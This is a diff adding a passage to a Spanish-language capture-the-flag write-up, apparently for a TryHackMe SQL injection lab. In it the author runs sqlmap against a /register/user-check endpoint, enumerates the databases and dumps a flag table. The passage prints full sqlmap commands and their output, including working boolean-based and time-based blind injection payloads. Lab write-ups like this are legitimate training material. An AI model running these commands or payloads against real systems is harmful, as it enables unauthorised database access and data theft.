@@ -283,3 +283,226 @@ Tengo credenciales para hacer un login.
 Tras el login está la primera flag.
 
 THM{FLAG1:*******************D2}
+
+Ya que he hecho login, ahora voy con register.
+
+Tras ver el código de /register, pruebo el siguiente comando para enumerar.
+
+sqlmap -u "http://10.129.150.190/register/user-check?username=admin" --method=GET --dbs --batch
+
+sqlmap -u "http://10.128.185.1/register/user-check?username=admin" --method=GET --dbs --batch
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.8.4#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:59:40 /2026-08-12/
+
+[13:59:40] [INFO] testing connection to the target URL
+[13:59:40] [INFO] checking if the target is protected by some kind of WAF/IPS
+[13:59:40] [INFO] testing if the target URL content is stable
+[13:59:40] [INFO] target URL content is stable
+[13:59:40] [INFO] testing if GET parameter 'username' is dynamic
+[13:59:40] [INFO] GET parameter 'username' appears to be dynamic
+[13:59:40] [WARNING] heuristic (basic) test shows that GET parameter 'username' might not be injectable
+[13:59:40] [INFO] testing for SQL injection on GET parameter 'username'
+[13:59:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[13:59:41] [INFO] GET parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[13:59:42] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[13:59:42] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[13:59:42] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[13:59:42] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[13:59:42] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[13:59:42] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[13:59:42] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[13:59:42] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[13:59:42] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[13:59:42] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[13:59:42] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[13:59:42] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[13:59:42] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[13:59:42] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[13:59:42] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[13:59:43] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[13:59:43] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[13:59:43] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[13:59:43] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[13:59:43] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[13:59:43] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[13:59:43] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[13:59:43] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[13:59:43] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[13:59:43] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
+[13:59:43] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[13:59:43] [INFO] testing 'Generic inline queries'
+[13:59:43] [INFO] testing 'MySQL inline queries'
+[13:59:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[13:59:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[13:59:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[13:59:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[13:59:43] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[13:59:43] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[13:59:43] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[13:59:54] [INFO] GET parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[13:59:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[13:59:54] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[13:59:54] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[13:59:54] [INFO] target URL appears to have 3 columns in query
+do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[13:59:55] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[13:59:56] [INFO] target URL appears to be UNION injectable with 3 columns
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[13:59:57] [INFO] testing 'MySQL UNION query (80) - 1 to 20 columns'
+[13:59:59] [INFO] testing 'MySQL UNION query (80) - 21 to 40 columns'
+[14:00:00] [INFO] testing 'MySQL UNION query (80) - 41 to 60 columns'
+[14:00:01] [INFO] testing 'MySQL UNION query (80) - 61 to 80 columns'
+[14:00:02] [INFO] testing 'MySQL UNION query (80) - 81 to 100 columns'
+[14:00:03] [INFO] checking if the injection point on GET parameter 'username' is a false positive
+GET parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 249 HTTP(s) requests:
+---
+Parameter: username (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=admin' AND 2131=2131 AND 'SLqt'='SLqt
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 9102 FROM (SELECT(SLEEP(5)))bszu) AND 'sVbB'='sVbB
+---
+[14:00:03] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12
+[14:00:03] [INFO] fetching database names
+[14:00:03] [INFO] fetching number of databases
+[14:00:03] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[14:00:03] [INFO] retrieved: 2
+[14:00:04] [INFO] retrieved: information_schema
+[14:00:09] [INFO] retrieved: sqhell_3
+available databases [2]:
+[*] information_schema
+[*] sqhell_3
+
+[14:00:12] [INFO] fetched data logged to text files under '/home/mksk/.local/share/sqlmap/output/10.128.185.1'
+[14:00:12] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 14:00:12 /2026-08-12/
+
+Bueno, bastante sencillo /register.
+Saco la db.
+
+sqlmap -u "http://10.128.185.1/register/user-check?username=admin" --method=GET -D sqhell_3 --tables --batch
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.8.4#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:01:10 /2026-08-12/
+
+[14:01:10] [INFO] resuming back-end DBMS 'mysql' 
+[14:01:10] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=admin' AND 2131=2131 AND 'SLqt'='SLqt
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 9102 FROM (SELECT(SLEEP(5)))bszu) AND 'sVbB'='sVbB
+---
+[14:01:10] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12
+[14:01:10] [INFO] fetching tables for database: 'sqhell_3'
+[14:01:10] [INFO] fetching number of tables for database 'sqhell_3'
+[14:01:10] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[14:01:10] [INFO] retrieved: 2
+[14:01:10] [INFO] retrieved: flag
+[14:01:12] [INFO] retrieved: users
+Database: sqhell_3
+[2 tables]
++-------+
+| flag  |
+| users |
++-------+
+
+[14:01:14] [INFO] fetched data logged to text files under '/home/mksk/.local/share/sqlmap/output/10.128.185.1'
+[14:01:14] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 14:01:14 /2026-08-12/
+
+Veo la tabla que contiene la flag.
+Y la extraigo.
+
+sqlmap -u "http://10.128.185.1/register/user-check?username=admin" --method=GET -D sqhell_3 -T flag --dump --batch
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.8.4#stable}
+|_ -| . [']     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:03:54 /2026-08-12/
+
+[14:03:54] [INFO] resuming back-end DBMS 'mysql' 
+[14:03:54] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=admin' AND 2131=2131 AND 'SLqt'='SLqt
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 9102 FROM (SELECT(SLEEP(5)))bszu) AND 'sVbB'='sVbB
+---
+[14:03:55] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12
+[14:03:55] [INFO] fetching columns for table 'flag' in database 'sqhell_3'
+[14:03:55] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[14:03:55] [INFO] retrieved: 2
+[14:03:55] [INFO] retrieved: id
+[14:03:56] [INFO] retrieved: flag
+[14:03:57] [INFO] fetching entries for table 'flag' in database 'sqhell_3'
+[14:03:57] [INFO] fetching number of entries for table 'flag' in database 'sqhell_3'
+[14:03:57] [INFO] retrieved: 1
+[14:03:57] [INFO] retrieved: THM{FLAG3:97A************************}
+[14:04:14] [INFO] retrieved: 1
+Database: sqhell_3
+Table: flag
+[1 entry]
++----+---------------------------------------------+
+| id | flag                                        |
++----+---------------------------------------------+
+| 1  | THM{FLAG3:97AE****************************} |
++----+---------------------------------------------+
+
+[14:04:14] [INFO] table 'sqhell_3.flag' dumped to CSV file '/home/mksk/.local/share/sqlmap/output/10.128.185.1/dump/sqhell_3/flag.csv'
+[14:04:14] [INFO] fetched data logged to text files under '/home/mksk/.local/share/sqlmap/output/10.128.185.1'
+[14:04:14] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 14:04:14 /2026-08-12/
+
+Consigo la tercera flag.
+
+
